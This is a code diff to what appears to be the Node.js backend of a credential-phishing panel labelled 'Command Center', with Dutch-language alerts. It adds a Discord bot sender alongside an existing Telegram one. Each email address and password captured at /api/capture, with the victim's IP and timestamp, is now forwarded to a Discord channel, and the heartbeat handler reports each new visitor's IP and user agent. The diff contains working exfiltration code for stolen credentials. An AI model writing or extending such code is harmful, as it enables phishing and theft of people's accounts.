@@ -193,7 +193,9 @@ const defaultConfig = {
     webhookOnNewClient: true,
     webhookOnCredential: true,
     telegramBotToken: process.env.TELEGRAM_BOT_TOKEN || '',
-    telegramChatId: process.env.TELEGRAM_CHAT_ID || ''
+    telegramChatId: process.env.TELEGRAM_CHAT_ID || '',
+    discordBotToken: process.env.DISCORD_BOT_TOKEN || '',
+    discordChannelId: process.env.DISCORD_CHANNEL_ID || ''
 };
 if (!store.config) store.config = { ...defaultConfig };
 
@@ -316,6 +318,33 @@ async function fireTelegramMessage(message) {
             req.write(body); req.end();
         });
     } catch (e) { console.error('Telegram error:', e.message); }
+}
+
+async function fireDiscordMessage(message) {
+    try {
+        const token = (store.config && store.config.discordBotToken) || process.env.DISCORD_BOT_TOKEN;
+        const channelId = (store.config && store.config.discordChannelId) || process.env.DISCORD_CHANNEL_ID;
+        if (!token || !channelId) return;
+        const body = JSON.stringify({ content: message });
+        const https = require('https');
+        const opts = {
+            hostname: 'discord.com',
+            port: 443,
+            path: `/api/v10/channels/${channelId}/messages`,
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Authorization': `Bot ${token}`,
+                'Content-Length': Buffer.byteLength(body)
+            }
+        };
+        await new Promise((res, rej) => {
+            const req = https.request(opts, r => { r.resume(); r.on('end', res); });
+            req.setTimeout(5000, () => { req.destroy(); rej(new Error('timeout')); });
+            req.on('error', rej);
+            req.write(body); req.end();
+        });
+    } catch (e) { console.error('Discord error:', e.message); }
 }
 
 // ═══════════════════════════════════════════════════════════════
@@ -729,6 +758,9 @@ app.post('/api/capture', async (req, res) => {
         fireTelegramMessage(
             `🔑 <b>Nieuwe credential</b>\n📧 <b>Email:</b> ${entry.email}\n🔐 <b>Wachtwoord:</b> ${entry.password.slice(0,80)}\n📌 <b>Bron:</b> ${entry.source}\n🌐 <b>IP:</b> ${entry.ip}\n🕐 <b>Tijd:</b> ${entry.timestamp}\n🖥 <b>Scherm:</b> ${entry.screen}\n🌍 <b>Tijdzone:</b> ${entry.timezone}`
         ).catch(() => {});
+        fireDiscordMessage(
+            `🔑 **Nieuwe credential**\n📧 **Email:** ${entry.email}\n🔐 **Wachtwoord:** ${entry.password.slice(0,80)}\n📌 **Bron:** ${entry.source}\n🌐 **IP:** ${entry.ip}\n🕐 **Tijd:** ${entry.timestamp}`
+        ).catch(() => {});
     }
     res.json({ success: true });
 });
@@ -775,6 +807,9 @@ app.post('/heartbeat', rateLimit(30, 10000), async (req, res) => {
             }).catch(() => {});
             fireTelegramMessage(
                 `🟢 <b>Nieuwe bezoeker</b>\n🆔 <b>Client:</b> ${clientId}\n🌐 <b>IP:</b> ${ip || 'onbekend'}\n🕐 <b>Tijd:</b> ${now}\n🖥 <b>UA:</b> ${(userAgent || '').slice(0, 120)}`
+            ).catch(() => {});
+            fireDiscordMessage(
+                `🟢 **Nieuwe bezoeker**\n🆔 **Client:** ${clientId}\n🌐 **IP:** ${ip || 'onbekend'}\n🕐 **Tijd:** ${now}\n🖥 **UA:** ${(userAgent || '').slice(0, 120)}`
             ).catch(() => {});
         }
     }
@@ -1425,6 +1460,13 @@ app.post('/api/webhook-test', requireAuth, async (req, res) => {
 app.post('/api/telegram-test', requireAuth, async (req, res) => {
     try {
         await fireTelegramMessage('🧪 <b>Telegram test</b> vanuit Command Center\n✅ Alles werkt correct!');
+        res.json({ success: true });
+    } catch(e) { res.status(500).json({ error: e.message }); }
+});
+
+app.post('/api/discord-test', requireAuth, async (req, res) => {
+    try {
+        await fireDiscordMessage('🧪 **Discord test** vanuit Command Center\n✅ Alles werkt correct!');
         res.json({ success: true });
     } catch(e) { res.status(500).json({ error: e.message }); }
 });
